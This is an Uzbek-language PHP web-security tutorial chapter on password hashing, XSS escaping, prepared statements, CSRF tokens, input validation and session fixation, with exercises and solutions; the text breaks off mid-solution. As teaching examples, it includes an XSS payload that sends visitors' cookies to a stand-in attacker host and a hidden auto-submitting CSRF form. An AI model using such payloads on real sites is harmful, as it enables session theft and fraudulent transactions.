# 4.4 Xavfsizlik asoslari

[⬅️ Oldingi: 4.3 Sessiyalar va login](./33-sessiyalar-va-login.md) · [🏠 README](./README.md) · [Keyingi: 4.5 JSON bilan ishlash va oddiy API ➡️](./35-json-bilan-ishlash-va-oddiy-api.md)

---

Haqiqiy sayt yozyapsiz — demak, uni **himoyalashingiz** kerak. Bitta xavfsizlik xatosi foydalanuvchilar ma'lumotini va butun loyihangizni xavf ostiga qo'yadi. Bu bo'limda har bir veb-dasturchi **bilishi shart** bo'lgan asosiy himoyalarni ko'ramiz.

Xavfsizlikni qulfli eshik deb tasavvur qiling. Bitta eshikni qulflab, boshqasini ochiq qoldirsangiz — uy baribir himoyasiz. Shuning uchun pastdagi himoyalarning **hammasi** birga ishlashi kerak: parol hashlash, XSS himoyasi, SQL injection himoyasi, CSRF tokeni, kirish ma'lumotini tekshirish. Keling, har birini birma-bir mustahkamlaymiz.

### 1) Parollarni to'g'ri saqlash

**Eng muhim qoida: parolni hech qachon ochiq (matn ko'rinishida) saqlamang!** Agar bazangizni kimdir o'g'irlasa, barcha parollar ochiq turadi. Buning o'rniga parolni **hashlab** saqlaymiz — "hash" qaytarib ochib bo'lmaydigan, aralashtirilgan ko'rinish.

PHP'da buning uchun tayyor, xavfsiz funksiyalar bor:

```php
<?php
// Parolni saqlashda — hashlash:
$parol = "maxfiy123";
$hash = password_hash($parol, PASSWORD_DEFAULT);
// $hash endi shunga o'xshash: $2y$10$N9qo8uLOickgx2ZMRZoMy...
// Buni bazaga saqlaymiz (ochiq parolni emas!)

// Tekshirishda (login paytida) — solishtirish:
$kiritilgan = "maxfiy123";
if (password_verify($kiritilgan, $hash)) {
    echo "Parol to'g'ri!";
} else {
    echo "Parol xato!";
}
```

- **`password_hash($parol, PASSWORD_DEFAULT)`** — parolni xavfsiz hashga aylantiradi. Shuni bazaga saqlaysiz.
- **`password_verify($kiritilgan, $hash)`** — foydalanuvchi kiritgan parolni saqlangan hash bilan solishtiradi. To'g'ri bo'lsa `true`.

Hashlangan parolni "qaytarib ochib" bo'lmaydi — faqat solishtirish mumkin. Shuning uchun bazangiz o'g'irlansa ham, parollar himoyalangan bo'ladi.

> **Muhim: hash uchun joy qoldiring.** `password_hash` natijasi bugun 60 belgi, lekin PHP algoritmni yangilaganda uzayishi mumkin. Shuning uchun bazada parol ustunini **`VARCHAR(255)`** qiling — hech qachon `VARCHAR(60)` emas. Aks holda hash kesilib, login butunlay ishdan chiqadi.

### `PASSWORD_DEFAULT` va `password_needs_rehash` — kelajakka tayyor parollar

`PASSWORD_DEFAULT` shunchaki "joriy eng yaxshi algoritm" degani. Bugun u **bcrypt**, ertaga PHP uni yanada kuchliroq algoritmga o'zgartirishi mumkin. Mana shu joyda `password_needs_rehash` yordamga keladi: u "bu hash eski usul/sozlama bilan yaratilganmi?" degan savolga javob beradi. Agar `true` qaytarsa — parolni **yangi** hash bilan qayta saqlaymiz.

Eng yoqimlisi: buni foydalanuvchidan parol so'ramasdan, **login paytida** qilamiz. Foydalanuvchi parolini to'g'ri kiritgan payt — bizda asl parol qo'limizda, demak uni yangi hash bilan jimgina yangilab qo'yamiz.

```php
<?php
$parol = "maxfiy123";

// Eski sozlama bilan yaratilgan hashni tasavvur qilaylik (zaif "cost"):
$eskiHash = password_hash($parol, PASSWORD_BCRYPT, ['cost' => 4]);

// Login paytida:
if (password_verify($parol, $eskiHash)) {
    echo "Parol to'g'ri.\n";

    // Hash eskirganmi? (algoritm yoki cost o'zgarganmi?)
    if (password_needs_rehash($eskiHash, PASSWORD_DEFAULT)) {
        // Ha — yangi, kuchliroq hash yaratamiz
        $yangiHash = password_hash($parol, PASSWORD_DEFAULT);
        // ... va bazada eskisini yangilaymiz:
        // UPDATE foydalanuvchilar SET parol = ? WHERE id = ?
        echo "Hash yangilandi — endi zamonaviy himoya.\n";
    }
}
```

- **`password_needs_rehash($hash, PASSWORD_DEFAULT)`** — `true` qaytaradi, agar hash eski algoritm yoki sozlama bilan yaratilgan bo'lsa.
- Bu — "ekin-ekib" yangilash: kodga bir marta qo'shasiz, va foydalanuvchilar kirgan sayin ularning parollari avtomatik zamonaviylashadi.

`password_get_info($hash)` esa hash haqida ma'lumot beradi (qaysi algoritm, qaysi sozlamalar) — debug paytida foydali:

```php
<?php
$hash = password_hash("salom", PASSWORD_DEFAULT);
print_r(password_get_info($hash));
// ['algo' => '2y', 'algoName' => 'bcrypt', 'options' => ['cost' => 12]]
```

### 2) XSS — zararli kod kiritilishidan himoya

**XSS** — foydalanuvchi matn maydoniga oddiy matn emas, zararli kod (masalan, `<script>`) kiritishi va u boshqa foydalanuvchilar brauzerida ishlashi. Buning oldini olish uchun, foydalanuvchi kiritgan matnni **ekranga chiqarganda** doim `htmlspecialchars` ishlatamiz:

```php
<?php
$izoh = $_POST['izoh'];   // foydalanuvchi kiritgan matn

// ❌ XAVFLI: agar foydalanuvchi <script>...</script> kiritsa, u ishlaydi
echo $izoh;

// ✅ XAVFSIZ: htmlspecialchars zararli belgilarni "zararsiz matnga" aylantiradi
echo htmlspecialchars($izoh);
```

`htmlspecialchars` `<`, `>`, `"` kabi maxsus belgilarni xavfsiz ko'rinishga aylantiradi, shunda ular kod sifatida emas, oddiy matn sifatida ko'rsatiladi. **Qoida: foydalanuvchidan kelgan har qanday matnni ekranga chiqarganda `htmlspecialchars` orqali chiqaring.**

XSS qanchalik xavfli ekanini bir misolda ko'ring. Tasavvur qiling, izoh formangiz bor va kimdir izoh sifatida buni yozdi:

```php
<?php
$zararliIzoh = '<script>document.location="http://yomon.uz/?o="+document.cookie</script>';

// ❌ Himoyasiz chiqarsangiz — bu skript HAR BIR mehmonning brauzerida ishlaydi
// va ularning cookie'sini (jumladan sessiya ID'sini!) o'g'riga jo'natadi.
echo $zararliIzoh;

// ✅ htmlspecialchars bilan — skript shunchaki matn bo'lib ko'rinadi, ishlamaydi:
echo htmlspecialchars($zararliIzoh);
// Brauzer buni ko'radi: &lt;script&gt;...&lt;/script&gt; — oddiy harflar, kod emas.
```

Ko'ryapsizmi — bitta unutilgan `htmlspecialchars` butun saytdagi foydalanuvchilarning sessiyasini o'g'irlatishi mumkin. Shuning uchun bu **muhokama qilinmaydigan odat**: chiqarish — doim `htmlspecialchars` orqali.

> **Maslahat:** `htmlspecialchars`'ga ikkinchi argument odatda kerak emas — PHP 8.1+ da standart bayroq `ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML401` bo'lib, ikkala turdagi qo'shtirnoqni (`"` va `'`) ham himoyalaydi. Eski darsliklarda `htmlspecialchars($x, ENT_QUOTES)` yozilganini ko'rsangiz — endi bu standart, qo'shimcha yozish shart emas.

### 3) SQL Injection — bazaga zararli so'rov (takror)

Buni 3.6'da ko'rgan edik, lekin shunchalik muhimki, takrorlaymiz. Foydalanuvchi ma'lumotini SQL so'roviga to'g'ridan-to'g'ri qo'shmang — **prepared statement** ishlating:

```php
<?php
// ❌ XAVFLI:
$natija = $pdo->query("SELECT * FROM foydalanuvchilar WHERE login = '$login'");

// ✅ XAVFSIZ:
$stmt = $pdo->prepare("SELECT * FROM foydalanuvchilar WHERE login = ?");
$stmt->execute([$login]);
```

Quyidagi diagramma nega to'g'ridan-to'g'ri qo'shish xavfli, prepared statement esa xavfsiz ekanini yonma-yon ko'rsatadi:

![SQL injection va prepared statement: xavfli to'g'ridan-to'g'ri so'rov va xavfsiz prepared statement](rasmlar/phd-sql-injection.svg)

### 4) CSRF — soxta so'rovlardan himoya

XSS va SQL injection'dan keyin **veb-xavfsizlikning uchinchi ustuni** — CSRF (Cross-Site Request Forgery, "saytlararo so'rov soxtalashtirish"). Bu eng ko'p e'tibordan chetda qoladigan, lekin juda xavfli hujum turi.

**Muammo nima?** Tasavvur qiling, foydalanuvchi sizning saytingizga kirib turibdi (sessiyasi ochiq). Endi u boshqa, yomon niyatli saytga kiradi. O'sha saytda yashirin forma bor:

```html
<!-- yomon.uz saytidagi yashirin forma -->
<form action="https://sizning-saytingiz.uz/pul-otkazish.php" method="post">
    <input type="hidden" name="kimga" value="hujumchi">
    <input type="hidden" name="summa" value="1000000">
</form>
<script>document.forms[0].submit();</script> <!-- avtomatik yuboradi -->
```

Foydalanuvchi hech narsa bosmasa ham, brauzer bu formani **sizning saytingizga** yuboradi — va **foydalanuvchining ochiq sessiyasi bilan** birga! Sizning sayt esa "sessiya bor, demak bu haqiqiy foydalanuvchi" deb o'ylab, pul o'tkazishni bajaradi. Mana shu — CSRF.

**Yechim: CSRF token.** Har bir formaga maxfiy, taxmin qilib bo'lmaydigan bir martalik **token** qo'shamiz. Bu token faqat sessiyada saqlanadi — yomon niyatli sayt uni bila olmaydi. So'rov kelganda tokenni tekshiramiz: agar mos kelmasa — rad etamiz.

**1-qadam: token yaratish va sessiyada saqlash.**

```php
<?php
session_start();

// Token hali yo'q bo'lsa — yaratamiz (taxmin qilib bo'lmaydigan, tasodifiy)
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
    // random_bytes(32) — 32 bayt kriptografik tasodifiy ma'lumot
    // bin2hex — uni 64 belgili matnga aylantiradi (saqlash uchun qulay)
}
```

- **`random_bytes(32)`** — oddiy `rand()` emas! Bu **kriptografik** darajada tasodifiy, taxmin qilib bo'lmaydigan baytlar. Parol va token uchun **doim** shuni ishlating.
- **`bin2hex(...)`** — ikkilik baytlarni o'qiladigan 16-lik (hex) matnga aylantiradi: 32 bayt → 64 belgi.

**2-qadam: tokenni formaga yashirin maydon sifatida qo'shish.**

```php
<form method="post" action="pul-otkazish.php">
    <!-- Yashirin CSRF tokeni — yomon sayt buni bila olmaydi -->
    <input type="hidden" name="csrf_token"
           value="<?= htmlspecialchars($_SESSION['csrf_token']) ?>">

    <input name="kimga" placeholder="Kimga">
    <input name="summa" placeholder="Summa">
    <button>O'tkazish</button>
</form>
```

**3-qadam: so'rov kelganda tokenni `hash_equals` bilan tekshirish.**

```php
<?php
session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Yuborilgan token sessiyadagiga mos keladimi?
    if (!hash_equals($_SESSION['csrf_token'] ?? '', $_POST['csrf_token'] ?? '')) {
        // Mos kelmadi — bu soxta so'rov! Rad etamiz.
        http_response_code(403);
        die("Xavfsizlik xatosi: so'rov rad etildi.");
    }

    // Token to'g'ri — so'rov haqiqiy, davom etamiz
    echo "Pul o'tkazildi.";
}
```

**Nega oddiy `==` emas, `hash_equals`?** Bu — nozik, lekin muhim nuqta. Oddiy `===` solishtirish ikki matnni belgi-belgi taqqoslaydi va birinchi farqda **darrov to'xtaydi**. Hujumchi javob qancha tez qaytganini o'lchab, tokenni belgi-belgi taxmin qilishi mumkin (bu "timing attack" deyiladi). **`hash_equals`** esa har doim **bir xil vaqt** sarflaydi — qancha mos kelishidan qat'i nazar. Shuning uchun token, hash va imzolarni solishtirganda **doim `hash_equals`** ishlating.

```php
<?php
// Timing-safe solishtirish namunasi:
$saqlangan = bin2hex(random_bytes(32));

var_dump(hash_equals($saqlangan, $saqlangan));        // true — bir xil
var_dump(hash_equals($saqlangan, "soxta_token"));     // false — xato
```

### CSRF yordamchi sinfi (qayta ishlatish uchun)

Har bir faylda token kodini takrorlamaslik uchun, kichik yordamchi **sinf** yozamiz. Zamonaviy PHP 8.4 uslubida — tiplangan, `static` metodlar bilan:

```php
<?php
final class Csrf
{
    // Token yaratadi (agar yo'q bo'lsa) va qaytaradi
    public static function token(): string
    {
        if (empty($_SESSION['csrf_token'])) {
            $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
        }
        return $_SESSION['csrf_token'];
    }

    // Formaga qo'yish uchun tayyor <input> qaytaradi
    public static function input(): string
    {
        $t = htmlspecialchars(self::token());
        return '<input type="hidden" name="csrf_token" value="' . $t . '">';
    }

    // Yuborilgan tokenni timing-safe tekshiradi
    public static function tekshir(?string $yuborilgan): bool
    {
        return !empty($_SESSION['csrf_token'])
            && is_string($yuborilgan)
            && hash_equals($_SESSION['csrf_token'], $yuborilgan);
    }
}
```

Ishlatish juda sodda bo'ladi:

```php
<?php
session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!Csrf::tekshir($_POST['csrf_token'] ?? null)) {
        die("So'rov rad etildi.");
    }
    echo "So'rov qabul qilindi.";
}
?>
<form method="post">
    <?= Csrf::input() ?>
    <button>Yuborish</button>
</form>
```

Mana — endi har bir formada `Csrf::input()`, har bir tekshiruvda `Csrf::tekshir(...)`. Ikki qator, butun CSRF himoyasi.

### 5) Kirish ma'lumotini tekshirish — `filter_var` bilan

Foydalanuvchidan kelgan har qanday ma'lumotga **ishonmaslik** kerak. Email — haqiqatan emailmi? Yosh — haqiqatan sonmi? Buning uchun PHP'da kuchli, tayyor vosita bor: **`filter_var`**. U ikki ishni bajaradi:

- **Validatsiya** (`FILTER_VALIDATE_*`) — "bu to'g'ri turdagi ma'lumotmi?" deb tekshiradi.
- **Sanitatsiya** (`FILTER_SANITIZE_*`) — "ma'lumotni tozalaydi", keraksiz belgilarni olib tashlaydi.

**Email tekshirish:**

```php
<?php
$email = "ali@example.com";

if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
    echo "Email to'g'ri.\n";
} else {
    echo "Email noto'g'ri!\n";
}

// Xato email:
var_dump(filter_var("ali@@example", FILTER_VALIDATE_EMAIL)); // false
```

**Butun son tekshirish:**

```php
<?php
$yosh = filter_var("25", FILTER_VALIDATE_INT);
var_dump($yosh); // int(25)

var_dump(filter_var("yigirma", FILTER_VALIDATE_INT)); // false — son emas
```

**Diapazon bilan (options):** masalan, yosh 13-120 oralig'ida bo'lsin:

```php
<?php
$yosh = filter_var("150", FILTER_VALIDATE_INT, [
    'options' => ['min_range' => 13, 'max_range' => 120]
]);
var_dump($yosh); // false — 120 dan katta, rad etildi

$yosh2 = filter_var("25", FILTER_VALIDATE_INT, [
    'options' => ['min_range' => 13, 'max_range' => 120]
]);
var_dump($yosh2); // int(25) — to'g'ri
```

**URL va float tekshirish:**

```php
<?php
var_dump(filter_var("https://ioqil.uz", FILTER_VALIDATE_URL)); // string — to'g'ri
var_dump(filter_var("shunchaki matn", FILTER_VALIDATE_URL));   // false

var_dump(filter_var("19.99", FILTER_VALIDATE_FLOAT)); // float(19.99)
```

**Sanitatsiya — ma'lumotni tozalash:**

```php
<?php
$kir = "  <b>Salom</b>  ";

// FILTER_SANITIZE_FULL_SPECIAL_CHARS — maxsus belgilarni xavfsiz qiladi
$toza = filter_var($kir, FILTER_SANITIZE_FULL_SPECIAL_CHARS);
echo $toza; // &lt;b&gt;Salom&lt;/b&gt;
```

> **Eslatma:** validatsiya — bu birinchi himoya, lekin **yagona** himoya emas. Email `filter_var`'dan o'tsa ham, uni ekranga chiqarganda baribir `htmlspecialchars` ishlating, bazaga yozganda baribir prepared statement ishlating. Himoyalar **qatlama-qatlam** bo'ladi.

### Tizimli validatsiya — barcha maydonni birga tekshirish

Amalda bitta forma bir necha maydondan iborat bo'ladi: login, email, yosh. Ularni birma-bir tekshirib, **xatolar massivini** to'playmiz. Bu — professional yondashuv: foydalanuvchiga barcha xatolarni bir vaqtda ko'rsatasiz.

```php
<?php
function royxatTekshir(array $data): array
{
    $xatolar = [];

    // Login: bo'sh emas, 3-20 belgi
    $login = trim($data['login'] ?? '');
    if ($login === '') {
        $xatolar['login'] = "Login bo'sh bo'lmasin";
    } elseif (mb_strlen($login) < 3 || mb_strlen($login) > 20) {
        $xatolar['login'] = "Login 3-20 belgi bo'lsin";
    }

    // Email: filter_var bilan
    $email = trim($data['email'] ?? '');
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $xatolar['email'] = "Email noto'g'ri";
    }

    // Yosh: 13-120 oralig'ida butun son
    $yosh = filter_var($data['yosh'] ?? '', FILTER_VALIDATE_INT, [
        'options' => ['min_range' => 13, 'max_range' => 120]
    ]);
    if ($yosh === false) {
        $xatolar['yosh'] = "Yosh 13-120 oralig'ida bo'lsin";
    }

    return $xatolar; // bo'sh massiv = xato yo'q
}

// Sinash:
$xatolar = royxatTekshir(['login' => 'ab', 'email' => 'xato', 'yosh' => '5']);
foreach ($xatolar as $maydon => $xato) {
    echo "$maydon: $xato\n";
}
// login: Login 3-20 belgi bo'lsin
// email: Email noto'g'ri
// yosh: Yosh 13-120 oralig'ida bo'lsin
```

Endi formada: `if (empty($xatolar)) { /* saqlash */ } else { /* xatolarni ko'rsatish */ }`.

### 6) Session fixation — `session_regenerate_id(true)`

Sessiyalar (4.3) bilan bog'liq nozik bir hujum bor: **session fixation**. Hujumchi foydalanuvchiga ma'lum bir sessiya ID'sini "tiqishtiradi" (masalan, havola orqali). Foydalanuvchi o'sha ID bilan login qiladi — va endi hujumchi **o'sha ID'ni bilgani uchun** foydalanuvchining hisobiga kira oladi.

**Yechim juda oddiy:** foydalanuvchi muvaffaqiyatli login qilgan **zahoti** sessiya ID'sini yangilang. Shunda eski ID (hujumchi bilgan) ishlamay qoladi.

```php
<?php
session_start();

// ... login tekshiruvi (password_verify va h.k.) ...
$loginTogri = true; // namuna

if ($loginTogri) {
    // Session fixation oldini olish: ID'ni yangilaymiz
    session_regenerate_id(true);
    //                     ^^^^ — true: eski sessiya faylini ham o'chiradi

    $_SESSION['kirgan'] = true;
    $_SESSION['login'] = $login;
}
```

- **`session_regenerate_id(true)`** — yangi sessiya ID yaratadi va eski ma'lumotni ko'chiradi. `true` argumenti eski sessiya faylini ham o'chiradi (tavsiya etiladi).
- Buni **login muvaffaqiyatli bo'lgan zahoti** bir marta chaqiring. Shunday qilib, login'dan oldingi har qanday ID befoyda bo'lib qoladi.

### 7) Yuklangan fayllar xavfsizligi

Foydalanuvchi fayl yuklasa (avatar, hujjat), bu **alohida xavf**: kimdir `.php` faylni yuklab, uni serverda ishga tushirishga urinishi mumkin. Fayl yuklash mexanizmini **4.6 (Fayl yuklash)** bo'limida batafsil ko'rasiz, lekin xavfsizlik nuqtai nazaridan asosiy qoidalarni hozir eslab qoling:

- **Kengaytmaga ishonmang** — `rasm.jpg` aslida `.php` bo'lishi mumkin. Faylning **haqiqiy turini** tekshiring (masalan `finfo` bilan MIME-turini aniqlash).
- **Ruxsat etilgan turlar ro'yxatini** belgilang (oq ro'yxat): faqat `image/jpeg`, `image/png` va h.k.
- **Fayl nomini o'zingiz yarating** — foydalanuvchi bergan nomni ishlatmang (masalan `bin2hex(random_bytes(16)) . '.jpg'`).
- **Yuklangan fayllarni web-orqali ishga tushib bo'lmaydigan papkada** saqlang (yoki PHP ishlamaydigan papkada).

Bularning to'liq, ishlaydigan kodini 4.6'da ko'rasiz. Hozircha esda tuting: **yuklangan fayl — eng katta xavf manbalaridan biri**, unga alohida e'tibor kerak.

### 8) Boshqa muhim qoidalar

- **HTTPS ishlating** (haqiqiy saytda) — ma'lumot shifrlangan holda uzatiladi.
- **Maxfiy ma'lumotni kodda saqlamang** — parollar, kalitlar alohida, maxfiy faylda bo'lsin (kodga yozilib, internetga chiqib ketmasin).
- **Foydalanuvchi ma'lumotini doim tekshiring** — bo'sh emasmi, to'g'ri turdami (4.1, `filter_var`).
- **Xato xabarlarida ko'p ma'lumot bermang** — "login yoki parol xato" deng, "bunday login yo'q" demang (yomon niyatli odamga yordam bermaslik uchun).
- **Cookie'larni himoyalang** — sessiya cookie'siga `httponly` va `secure` bayroqlarini qo'ying (JavaScript o'qiy olmasin, faqat HTTPS orqali yuborilsin).

### Xavfsiz login (hashlangan parol + CSRF + session_regenerate_id)

4.3'dagi login tizimini endi to'liq xavfsiz qilamiz — barcha himoyalarni birga jamlaymiz:

```php
<?php
session_start();

// CSRF token (forma uchun)
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // 1) CSRF himoyasi
    if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'] ?? '')) {
        die("So'rov rad etildi.");
    }

    // 2) Validatsiya
    $login = trim($_POST['login'] ?? '');

    // 3) Bazadan foydalanuvchini topish (prepared — SQL injection'dan himoya)
    $stmt = $pdo->prepare("SELECT * FROM foydalanuvchilar WHERE login = ?");
    $stmt->execute([$login]);
    $foydalanuvchi = $stmt->fetch();

    // 4) Parolni tekshirish (password_verify)
    if ($foydalanuvchi && password_verify($_POST['parol'], $foydalanuvchi['parol'])) {

        // 5) Session fixation oldini olish
        session_regenerate_id(true);

        // 6) Hash eskirgan bo'lsa — jimgina yangilaymiz
        if (password_needs_rehash($foydalanuvchi['parol'], PASSWORD_DEFAULT)) {
            $yangi = password_hash($_POST['parol'], PASSWORD_DEFAULT);
            $upd = $pdo->prepare("UPDATE foydalanuvchilar SET parol = ? WHERE id = ?");
            $upd->execute([$yangi, $foydalanuvchi['id']]);
        }

        $_SESSION['kirgan'] = true;
        $_SESSION['login'] = $foydalanuvchi['login'];
    } else {
        // Login yoki parol xato (qaysi biri ekanini aytmaymiz!)
        $xato = "Login yoki parol xato";
    }
}
?>
<form method="post">
    <input type="hidden" name="csrf_token"
           value="<?= htmlspecialchars($_SESSION['csrf_token']) ?>">
    <input name="login" placeholder="Login">
    <input type="password" name="parol" placeholder="Parol">
    <button>Kirish</button>
</form>
<p style="color:red"><?= htmlspecialchars($xato ?? "") ?></p>
```

Ko'ryapsizmi — bitta login formasida **oltita** himoya qatlami: CSRF, validatsiya, prepared statement, `password_verify`, `session_regenerate_id`, `password_needs_rehash`. Mana shu — professional, xavfsiz login.

### Mashqlar

**Oson**
1. `password_hash` bilan parolni hashlang va natijani ko'ring.
2. `password_verify` bilan to'g'ri va noto'g'ri parolni tekshiring.
3. Foydalanuvchi matnini `htmlspecialchars` bilan va usiz chiqarib, farqni ko'ring (`<b>salom</b>` kiriting).
4. Nima uchun parolni ochiq saqlash xavfli — o'z so'zingiz bilan yozing.
5. `random_bytes(32)` va `bin2hex` bilan CSRF token yarating va uzunligini (64 belgi) tekshiring.
6. `filter_var` bilan to'g'ri (`ali@mail.uz`) va xato (`ali@@`) emailni tekshiring, natijani ko'ring.

**O'rta**
7. Ro'yxatdan o'tish formasi: parolni hashlab bazaga saqlang.
8. Login formasi: bazadan foydalanuvchini topib, `password_verify` bilan parolni tekshiring.
9. Izoh formasini yarating: kiritilgan izohlarni `htmlspecialchars` bilan xavfsiz ko'rsating.
10. SQL injection xavfini va prepared statement yechimini misol bilan tushuntiring.
11. CSRF token bilan himoyalangan forma yarating: sessiyada token saqlang, formaga yashirin maydon qo'shing, yuborilganda `hash_equals` bilan tekshiring.
12. `filter_var` yordamida tizimli validatsiya funksiyasi yozing: login (3-20 belgi), email va yosh (13-120) ni tekshirib, xatolar massivini qaytarsin.
13. `password_needs_rehash` qanday ishlashini ko'rsating: zaif `cost` bilan hash yarating, keyin `password_needs_rehash` `true` qaytarganini tekshiring.

**Qiyin**
14. To'liq, xavfsiz foydalanuvchi tizimi: ro'yxatdan o'tish (hashlangan parol), login (`password_verify`), sessiya bilan himoyalangan panel, chiqish. Hammasi bazaga ulangan, prepared statement va `htmlspecialchars` bilan.
15. Izohlar tizimi (4.2 mini-loyihasiga o'xshash): foydalanuvchilar izoh qoldiradi, izohlar bazaga saqlanadi va xavfsiz (`htmlspecialchars`) ko'rsatiladi. SQL injection va XSS'dan himoyalangan bo'lsin.
16. `Csrf` yordamchi sinfini yozing (`token`, `input`, `tekshir` metodlari bilan) va uni izohlar formasiga qo'shing — endi forma CSRF'dan ham himoyalangan bo'lsin.
17. To'liq xavfsiz login: CSRF token, validatsiya, prepared statement, `password_verify`, `session_regenerate_id(true)` va `password_needs_rehash` — hammasini bitta faylda birlashtiring.

<details markdown="1">
<summary>Yechim — 4 (nega ochiq parol xavfli)</summary>

Parolni ochiq saqlash xavfli, chunki:
1. **Baza o'g'irlansa** — barcha foydalanuvchilarning parollari darrov ko'rinadi. Yomon niyatli odam ularning hisoblariga (va ko'pincha boshqa saytlardagi hisoblariga, chunki odamlar bir xil parol ishlatadi) kira oladi.
2. **Ichki xavf** — bazaga kirish huquqi bor har kim (dasturchi, admin) parollarni ko'radi.

Hashlangan parol esa "qaytarib ochilmaydi" — `password_hash` bir tomonlama. Hatto baza o'g'irlansa ham, hujumchi faqat ma'nosiz hashlarni ko'radi, asl parolni emas. Login paytida `password_verify` kiritilgan parolni hash bilan solishtiradi (asl parolni tiklamasdan). Shuning uchun parolni **doim** `password_hash` bilan saqlang.
</details>

<details markdown="1">
<summary>Yechim — 5 (CSRF token yaratish)</summary>

```php
<?php
$token = bin2hex(random_bytes(32));
echo "Token: $token\n";
echo "Uzunligi: " . strlen($token) . " belgi\n"; // 64 belgi

// Timing-safe solishtirish:
var_dump(hash_equals($token, $token));      // true — bir xil
var_dump(hash_equals($token, "soxta"));     // false — xato
```

`random_bytes(32)` 32 bayt kriptografik tasodifiy ma'lumot beradi (taxmin qilib bo'lmaydigan). `bin2hex` uni 64 belgili hex matnga aylantiradi (har bayt 2 belgi). Token va parol uchun **doim** `random_bytes` ishlating — `rand()` yoki `mt_rand()` emas, chunki ular taxmin qilinishi mumkin.
</details>

<details markdown="1">
<summary>Yechim — 11 (CSRF himoyalangan forma)</summary>

```php
<?php
// csrf-forma.php
session_start();

// Token yaratish (yo'q bo'lsa)
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

$natija = "";
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Timing-safe tekshiruv
    if (hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'] ?? '')) {
        $natija = "So'rov qabul qilindi: " . htmlspecialchars($_POST['xabar'] ?? '');
    } else {
        $natija = "So'rov rad etildi — CSRF token noto'g'ri!";
    }
}
?>
<form method="post">
    <input type="hidden" name="csrf_token"
           value="<?= htmlspecialchars($_SESSION['csrf_token']) ?>">
    <input name="xabar" placeholder="Xabar">
    <button>Yuborish</button>
</form>
<p><?= $natija ?></p>
```

Token sessiyada saqlanadi (yomon sayt uni bila olmaydi), formaga yashirin maydon orqali qo'shiladi, va so'rov kelganda `hash_equals` bilan **timing-safe** tekshiriladi. Token mos kelmasa — so'rov rad etiladi.
</details>

<details markdown="1">
<summary>Yechim — 12 (tizimli validatsiya)</summary>

```php
<?php
function royxatTekshir(array $data): array
{
    $xatolar = [];

    $login = trim($data['login'] ?? '');
    if ($login === '') {
        $xatolar['login'] = "Login bo'sh bo'lmasin";
    } elseif (mb_strlen($login) < 3 || mb_strlen($login) > 20) {
        $xatolar['login'] = "Login 3-20 belgi bo'lsin";
    }

    $email = trim($data['email'] ?? '');
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $xatolar['email'] = "Email noto'g'ri";
    }

    $yosh = filter_var($data['yosh'] ?? '', FILTER_VALIDATE_INT, [
        'options' => ['min_range' => 13, 'max_range' => 120]
    ]);
    if ($yosh === false) {
        $xatolar['yosh'] = "Yosh 13-120 oralig'ida bo'lsin";
    }

    return $xatolar;
}

// Sinov:
print_r(royxatTekshir(['login' => 'ali', 'email' => 'ali@mail.uz', 'yosh' => '25']));
// Array() — xato yo'q

print_r(royxatTekshir(['login' => 'ab', 'email' => 'xato', 'yosh' => '5']));
// login, email, yosh — uchchalasi ham xato
```

Funksiya har bir maydonni alohida tekshiradi va **xatolar massivini** qaytaradi. Massiv bo'sh bo'lsa — hammasi to'g'ri, saqlash mumkin. Bo'sh bo'lmasa — foydalanuvchiga barcha xatolarni bir vaqtda ko'rsatamiz. `filter_var` email va yosh uchun, `mb_strlen` (kirill/lotin belgilarni to'g'ri sanash uchun) login uzunligi uchun ishlatildi.
</details>

<details markdown="1">
<summary>Yechim — 13 (password_needs_rehash)</summary>

```php
<?php
$parol = "maxfiy123";

// Zaif "cost" (4) bilan eski hash yaratamiz:
$eskiHash = password_hash($parol, PASSWORD_BCRYPT, ['cost' => 4]);

// Hozirgi standart bilan solishtiramiz — rehash kerakmi?
var_dump(password_needs_rehash($eskiHash, PASSWORD_DEFAULT)); // true

// Yangi, kuchli hash:
$yangiHash = password_hash($parol, PASSWORD_DEFAULT);
var_dump(password_needs_rehash($yangiHash, PASSWORD_DEFAULT)); // false — zamonaviy
```

`password_needs_rehash` "bu hash hozirgi standartga mos keladimi?" deb tekshiradi. Zaif `cost` (4) bilan yaratilgan hash uchun `true` qaytaradi — demak uni yangilash kerak. Amalda buni **login paytida** qilamiz: parol to'g'ri kiritilgan payt (bizda asl parol bor) `password_needs_rehash` `true` qaytarsa, yangi hash yaratib bazani jimgina yangilaymiz. Foydalanuvchi hech narsa sezmaydi, lekin uning paroli zamonaviylashadi.
</details>

<details markdown="1">
<summary>Yechim — 14 (to'liq xavfsiz foydalanuvchi tizimi)</summary>

To'rt fayl. `foydalanuvchilar` jadvali: `id`, `login`, `parol` (hash uchun VARCHAR(255)).

```php
<?php
// 1) royxatdan.php — hashlangan parol bilan ro'yxatga olish
require 'ulanish.php';
if (!empty($_POST['login'])) {
    $hash = password_hash($_POST['parol'], PASSWORD_DEFAULT);
    $stmt = $pdo->prepare("INSERT INTO foydalanuvchilar (login, parol) VALUES (?, ?)");
    $stmt->execute([trim($_POST['login']), $hash]);
    echo "Ro'yxatdan o'tdingiz!";
}
?>
<form method="post">
    <input name="login" placeholder="Login" required>
    <input type="password" name="parol" placeholder="Parol" required>
    <button>Ro'yxatdan o'tish</button>
</form>
```
```php
<?php
// 2) login.php — password_verify bilan tekshirish
session_start();
require 'ulanish.php';
if (!empty($_POST['login'])) {
    $stmt = $pdo->prepare("SELECT * FROM foydalanuvchilar WHERE login = ?");
    $stmt->execute([$_POST['login']]);
    $u = $stmt->fetch();
    if ($u && password_verify($_POST['parol'], $u['parol'])) {
        session_regenerate_id(true); // session fixation oldini olish
